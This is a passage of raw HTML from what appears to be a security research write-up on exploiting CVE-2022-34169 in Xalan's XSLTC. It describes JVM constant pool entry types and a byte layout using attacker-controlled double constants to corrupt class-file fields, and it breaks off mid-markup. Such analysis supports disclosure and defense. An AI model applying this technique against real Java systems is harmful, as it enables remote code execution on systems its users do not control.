style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;CONSTANT_NameAndType_info {&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u1 tag;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 name_index;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 descriptor_index;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr style=\"height: 23.5pt;\"&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;a href=\"https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.8\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"background-color: transparent; color: #1155cc; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;CONSTANT_MethodHandle&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;/td&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;15&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Describes a method handle.&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;CONSTANT_MethodHandle_info {&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u1 tag;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u1 reference_kind;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 reference_index;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr style=\"height: 23.5pt;\"&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;a href=\"https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.9\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"background-color: transparent; color: #1155cc; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;CONSTANT_MethodType&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;/td&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;16&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Describes a method type. Points to a UTF8 constant containing a method descriptor.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;CONSTANT_MethodType_info {&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u1 tag;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 descriptor_index;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;A perfect constant type for exploiting CVE-2022-34169 would be dynamically sized containing fully attacker controlled content. Unfortunately, no such type exists. While CONSTANT_Utf8 is dynamically sized, its content isn’t a raw string representation but an encoding format JVM calls “modified UTF-8”. This encoding introduces some significant restrictions on the data stored and rules out null bytes, making it mostly useless for corrupting class fields.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;The next best thing we can get is a fixed size constant type with full control over the content. CONSTANT_Long seems like an obvious candidate, but XSLTC never creates attacker-controlled long constants during the compilation process. Instead we can use large floating numbers to create CONSTANT_Double entry with (almost) fully controlled content. This gives us a nice primitive where we can corrupt class fields behind the constant pool with a byte pattern like &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt;0x06&lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"color: #c53929; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0xXX 0xXX 0xXX 0xXX 0xXX 0xXX 0xXX 0xXX &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt;0x06&lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"color: #3367d6; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0xYY 0xYY 0xYY 0xYY 0xYY 0xYY 0xYY 0xYY&lt;/span&gt;&lt;span style=\"color: #c53929; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt;0x06&lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"color: #ff9900; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0xZZ 0xZZ 0xZZ 0xZZ 0xZZ 0xZZ 0xZZ 0xZZ&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Unfortunately, this primitive alone isn’t sufficient for crafting a useful class file due to the requirements of the fields right after the constant_pool:&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;div align=\"left\" dir=\"ltr\" style=\"margin-left: 0pt;\"&gt;&lt;table style=\"border-collapse: collapse; border: none;\"&gt;&lt;colgroup&gt;&lt;/colgroup&gt;&lt;tbody&gt;&lt;tr style=\"height: 0pt;\"&gt;&lt;td style=\"background-color: #fafafa; border-bottom: solid #e0e0e0 1pt; border-left: solid #e0e0e0 1pt; border-right: solid #e0e0e0 1pt; border-top: solid #e0e0e0 1pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp; &amp;nbsp; cp_info&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; constant_pool&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;[&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;constant_pool_count&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;-&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #c53929; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;1&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;];&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; access_flags&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; this_class&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; super_class&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;access_flags&lt;/span&gt;&lt;span style=\"font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;is a big endian mask of &lt;/span&gt;&lt;a href=\"https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.7:~:text=Table%C2%A04.1%2DB.%C2%A0Class%20access%20and%20property%20modifiers\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;flags&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; describing access permissions and properties of the class.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;While the JVM is happy to ignore unknown flag values, we need to avoid setting flags like ACC_INTERFACE (0x0200) or ACC_ABSTRACT (0x0400) that result in an unusable class. This means that we can’t use a CONSTANT_Double entry as our first out-of-bound constant as its tag byte of 0x06 will get interpreted as these flags.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;this_class&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; is an index into the constant pool and has to point to a CONSTANT_Class entry that describes the class defined with this file. Fortunately, neither the JVM nor XSLTC cares much about which class we pretend to be, so this value can point to almost any CONSTANT_Class entry that XSLTC ends up generating. (The only restriction is that it can’t be a part of a protected namespace like java.lang.)&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;super_class&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; is another index to a CONSTANT_Class entry in the constant pool. While the JVM is happy with any class, XSLTC expects this to be a reference to the &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;org.apache.xalan.xsltc.runtime.AbstractTranslet&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; class, otherwise loading and initialization of the class file fails.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;After a lot of trial and error I ended up with the following approach to meet these requirements:&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"color: #24292f; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;CONST_STRING&lt;/span&gt;&lt;span style=\"color: #38761d; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;CONST_DOUBLE&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: #fce5cd; color: #38761d; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 14pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0x08 0x07 &lt;/span&gt;&lt;span style=\"background-color: #fce5cd; color: red; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 14pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0x02&lt;/span&gt;&lt;span style=\"background-color: #fce5cd; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 14pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 14pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: #fce5cd; color: red; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 14pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0x06 &lt;/span&gt;&lt;span style=\"background-color: #fce5cd; color: #ff9900; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 14pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0xXX 0xXX&lt;/span&gt;&lt;span style=\"background-color: #fce5cd; color: red; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 14pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: #fce5cd; color: #4a86e8; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 14pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0x00 0x00&lt;/span&gt;&lt;span style=\"background-color: #fce5cd; color: red; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 14pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: #fce5cd; color: #9900ff; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 14pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0x00 0x00&lt;/span&gt;&lt;span style=\"background-color: #fce5cd; color: red; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 14pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: #fce5cd; color: magenta; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 14pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0xZZ 0xZZ&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"color: #38761d; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;access_flags&amp;nbsp; &lt;/span&gt;&lt;span style=\"color: red; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;this_class&lt;/span&gt;&lt;span style=\"color: #38761d; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &amp;nbsp; &lt;/span&gt;&lt;span style=\"color: #ff9900; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;super_class&amp;nbsp; &lt;/span&gt;&lt;span style=\"color: #4a86e8; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;ints_count&lt;/span&gt;&lt;span 